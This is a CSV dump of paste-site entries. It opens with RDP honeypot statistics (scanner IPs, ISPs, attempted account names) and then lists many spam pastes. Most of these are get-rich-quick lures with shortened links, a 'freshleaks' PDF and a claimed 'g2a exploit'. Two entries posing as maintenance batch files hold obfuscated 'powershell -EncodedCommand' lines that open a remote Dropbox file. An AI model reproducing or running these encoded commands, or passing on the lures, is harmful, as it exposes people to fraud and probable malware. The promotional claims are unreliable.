id,title,username,language,date,content
iy0Q9NdN,2025-05-09_stats.json,rdp_snitch,JSON,Saturday 10th of May 2025 07:15:15 PM CDT,"{
  ""ip"": {
    ""157.245.159.1"": 5677,
    ""143.198.126.238"": 13600,
    ""147.182.237.225"": 3528,
    ""165.232.175.227"": 10359,
    ""143.198.221.164"": 12543,
    ""167.99.10.7"": 13533,
    ""209.97.169.106"": 14958,
    ""67.205.177.1"": 13104,
    ""167.172.131.118"": 13752,
    ""143.198.129.146"": 13428,
    ""45.117.177.2"": 1113,
    ""128.199.211.130"": 9327,
    ""128.199.168.88"": 4119,
    ""128.199.248.18"": 10785,
    ""174.138.21.248"": 7788,
    ""157.245.150.219"": 7041,
    ""128.199.166.57"": 4221,
    ""41.33.88.113"": 57,
    ""71.82.170.60"": 60,
    ""111.89.163.100"": 66,
    ""123.103.219.70"": 18,
    ""211.185.207.14"": 9,
    ""80.94.95.198"": 36,
    ""91.238.181.93"": 6,
    ""213.226.113.3"": 6,
    ""91.238.181.92"": 12,
    ""147.185.132.222"": 9,
    ""80.94.95.203"": 12,
    ""93.123.109.120"": 9,
    ""48.216.243.126"": 3,
    ""47.252.113.102"": 12,
    ""167.94.146.59"": 3,
    ""157.245.104.150"": 9,
    ""147.185.132.45"": 9,
    ""47.236.87.170"": 3,
    ""198.235.24.50"": 9,
    ""154.197.57.94"": 3,
    ""206.168.34.36"": 3,
    ""134.122.128.45"": 3,
    ""185.170.113.100"": 3,
    ""88.214.25.125"": 6,
    ""205.210.31.201"": 9
  },
  ""asn"": {
    ""AS14061"": 157772,
    ""AS131353"": 1113,
    ""AS8452"": 57,
    ""AS20115"": 60,
    ""AS2514"": 66,
    ""AS4826"": 18,
    ""AS4766"": 9,
    ""AS204428"": 48,
    ""AS49434"": 18,
    ""AS34665"": 6,
    ""AS396982"": 36,
    ""AS48090"": 9,
    ""AS8075"": 3,
    ""AS45102"": 15,
    ""AS398705"": 3,
    ""AS135377"": 3,
    ""AS398324"": 3,
    ""AS152194"": 3,
    ""AS197540"": 3,
    ""AS35042"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 157772,
    ""NHANHOA"": 1113,
    ""TE Data"": 57,
    ""Charter Communications"": 60,
    ""NTT PC Communications, Inc."": 66,
    ""Vocus PTY LTD"": 18,
    ""Korea Telecom"": 9,
    ""SS-Net"": 48,
    ""Datacenter location PAR1 France"": 18,
    ""PIN DC"": 6,
    ""Google LLC"": 36,
    ""Techoff SRV Limited"": 9,
    ""Microsoft Corporation"": 3,
    ""Alibaba Cloud LLC"": 12,
    ""Censys, Inc."": 6,
    ""Alibaba (US) Technology Co., Ltd."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""CTG Server Ltd."": 3,
    ""netcup GmbH"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""DigitalOcean, LLC"": 131135,
    ""Digital Ocean"": 26637,
    ""Branch of Nhan Hoa Software Company"": 1113,
    ""Unknown"": 57,
    ""Spectrum"": 60,
    ""InfoSphere"": 66,
    ""Vocus Communications"": 18,
    ""Kornet"": 9,
    ""Unmanaged LTD"": 48,
    ""ThinkTech Technology Industrial CO. Limited"": 24,
    ""IT Hostline Ltd"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Techoff SRV Limited"": 9,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""Alibaba Cloud - US"": 12,
    ""Censys, Inc."": 6,
    ""Alibaba.com LLC"": 3,
    ""Cloud Network HK Co., Limited"": 3,
    ""Rackip Consultancy Pte. LTD"": 3,
    ""netcup GmbH"": 3
  },
  ""regionName"": {
    ""South West"": 76033,
    ""New Jersey"": 53989,
    ""California"": 16992,
    ""Ho Chi Minh"": 1113,
    ""Florida"": 10785,
    ""Dakahlia"": 57,
    ""Wisconsin"": 60,
    ""Tokyo"": 66,
    ""Western Australia"": 18,
    ""Sejong-si"": 9,
    ""Budapest"": 48,
    ""\u00cele-de-France"": 18,
    ""St.-Petersburg"": 6,
    ""Andorra la Vella"": 9,
    ""Virginia"": 15,
    ""Hesse"": 3,
    ""Karnataka"": 9,
    ""North West"": 3,
    ""Kowloon"": 3,
    ""Illinois"": 3,
    ""Central and Western District"": 3,
    ""Bavaria"": 3,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 76036,
    ""United States"": 81844,
    ""Vietnam"": 1113,
    ""Egypt"": 57,
    ""Japan"": 66,
    ""Australia"": 18,
    ""South Korea"": 9,
    ""Hungary"": 48,
    ""France"": 18,
    ""Russia"": 6,
    ""Andorra"": 9,
    ""Germany"": 6,
    ""India"": 9,
    ""Hong Kong"": 12
  },
  ""account"": {
    ""hello"": 158894,
    ""142.93.8.59"": 255,
    ""Test"": 30,
    ""ZaWONmaVg"": 3,
    ""GyvGDd"": 3,
    ""omCHte"": 3,
    ""Administr"": 12,
    ""(empty)"": 15,
    ""nmap"": 3,
    ""aUxtxwBrt"": 3,
    ""dfWfXg"": 3,
    ""EWYLCr"": 3,
    ""nQFsATqXv"": 3,
    ""imasYx"": 3,
    ""JvpcvF"": 3,
    ""Administrator"": 3,
    ""--"": 3,
    ""IFWEwfMFx"": 3,
    ""fmFAAl"": 3,
    ""zNliSX"": 3
  },
  ""keyboard"": {
    ""Unknown"": 159251
  },
  ""client_build"": {
    ""Unknown"": 159251
  },
  ""client_name"": {
    ""Unknown"": 159251
  },
  ""ip_type"": {
    ""hosting"": 158954,
    ""Unknown"": 288,
    ""hosting & proxy"": 9
  }
}"
Q5Jr729n,⭐️EARN $500 INSTANTLY⭐ CW,Chochilandia,JavaScript,Saturday 10th of May 2025 07:14:22 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

KoUunJ5dQ9
"
xuH29aTE,2025-05-09T17:57:32.354182 15,yaseenshawkinour,JavaScript,Saturday 10th of May 2025 07:14:09 PM CDT,704398 - check it out at https://tinyurl.com/48rykfr6
4GVMYPWn,??Make $3000 in 24 hours W7 55,lefiel82,JavaScript,Saturday 10th of May 2025 07:12:11 PM CDT,810773 - check it out at https://tinyurl.com/2uhb72sb
MZiBzR0N,⭐️Make $3000 in Month [BTC]  KR,Chochilandia,JavaScript,Saturday 10th of May 2025 07:11:18 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

izgDUAjaXY
"
bXbsz2mr,??Earn $2000 a Month From Home C 02,Johncally,JavaScript,Saturday 10th of May 2025 07:09:05 PM CDT,324028 - check it out at https://tinyurl.com/mpghpdf
Z8ywavX3,restart_services.cmd 96,yerspppppp,JavaScript,Saturday 10th of May 2025 07:08:33 PM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBkADAANgA1AGYAOQAyADQA
rXKJXvKy,⭐️Earn $2000 a Month [EASY GUIDE]  ND,Chochilandia,JavaScript,Saturday 10th of May 2025 07:08:13 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

hHvV79SHXf
"
KmR3Mjaa,??Make $3000 in 24 hours W7 94,tashrid,JavaScript,Saturday 10th of May 2025 07:07:37 PM CDT,052711 - check it out at https://tinyurl.com/4fwb5wkp
t45DAy8v,??Make 2000$+ daily together B 28,Serachids,JavaScript,Saturday 10th of May 2025 07:06:05 PM CDT,529138 - check it out at https://tinyurl.com/v18latest
5ajiR6gK,2025-05-09T17:57:32.354182 60,HamdanIsAwesome,JavaScript,Saturday 10th of May 2025 07:05:12 PM CDT,417416 - check it out at https://tinyurl.com/yc4w4vys
jK7XAHQH,⭐️MAKE 3000$ IN 1 DAY WITH BTC WG,Chochilandia,JavaScript,Saturday 10th of May 2025 07:05:10 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

vgTXopmyJr
"
JM25C09U,Black Hole optimization v2 (181 nodes) 10,ii_xjackk,JavaScript,Saturday 10th of May 2025 07:04:36 PM CDT,627522 - check it out at https://tinyurl.com/3u95mw4w
0vkSKQwm,Black Hole optimization v2 (181 nodes) 57,yaseenshawkinour,JavaScript,Saturday 10th of May 2025 07:03:08 PM CDT,310461 - check it out at https://tinyurl.com/48rykfr6
Vy7eSXWP,⭐️EARN $500 INSTANTLY⭐ CW,Chochilandia,JavaScript,Saturday 10th of May 2025 07:02:06 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

uTcNvxRDB6
"
y00bAH3R,⭐️Make $3000 in Month [BTC]  KR,Chochilandia,JavaScript,Saturday 10th of May 2025 06:59:02 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

G8XFic6CCu
"
h25rztnC,Test roblox v3 47,Johncally,JavaScript,Saturday 10th of May 2025 06:57:33 PM CDT,841583 - check it out at https://tinyurl.com/mpghpdf
i8TB42wQ,cleanup_temp_files.bat 53,yerspppppp,JavaScript,Saturday 10th of May 2025 06:57:31 PM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQA5ADQANwBmADIAYQA1ADkA
KZeBbBNd,??Make 2000$+ daily together B 22,tashrid,JavaScript,Saturday 10th of May 2025 06:56:35 PM CDT,253760 - check it out at https://tinyurl.com/4fwb5wkp
QUbU4dbi,⭐️Earn $2000 a Month [EASY GUIDE]  ND,arq091,JavaScript,Saturday 10th of May 2025 06:55:49 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

W5CFNGhgTf
"
rWj10qHu,Test roblox v3 82,Serachids,JavaScript,Saturday 10th of May 2025 06:55:05 PM CDT,119488 - check it out at https://tinyurl.com/v18latest
Thyw45Xp,2025-05-09T17:57:32.354182 37,HamdanIsAwesome,JavaScript,Saturday 10th of May 2025 06:54:11 PM CDT,704883 - check it out at https://tinyurl.com/yc4w4vys
mwbHxF4u,??Make 2000$+ daily together B 19,ii_xjackk,JavaScript,Saturday 10th of May 2025 06:53:02 PM CDT,360439 - check it out at https://tinyurl.com/3u95mw4w
Cw1mKghW,⭐️MAKE 3000$ IN 1 DAY WITH BTC WG,arq091,JavaScript,Saturday 10th of May 2025 06:52:45 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

27HO6yGVEN
"
hWs63xjw,??Make $3000 in 24 hours W7 30,lenurb,JavaScript,Saturday 10th of May 2025 06:51:03 PM CDT,600007 - check it out at https://tinyurl.com/yc4w4vys
2VuTfHxM,⭐️EARN $500 INSTANTLY⭐ CW,arq091,JavaScript,Saturday 10th of May 2025 06:49:42 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

3wXvLxe3Zy
"
91kKPBxd,Black Hole optimization v2 (181 nodes) 70,lefiel82,JavaScript,Saturday 10th of May 2025 06:49:06 PM CDT,708083 - check it out at https://tinyurl.com/2uhb72sb
t1Se5TRf,2025-05-09T17:57:32.354182 92,Johncally,JavaScript,Saturday 10th of May 2025 06:46:32 PM CDT,484736 - check it out at https://tinyurl.com/mpghpdf
iNDEZnZt,⭐️MAKE 3000$ IN 1 DAY WITH BTC WG,lollollol50,JavaScript,Saturday 10th of May 2025 06:46:28 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

hW7dylT7n4
"
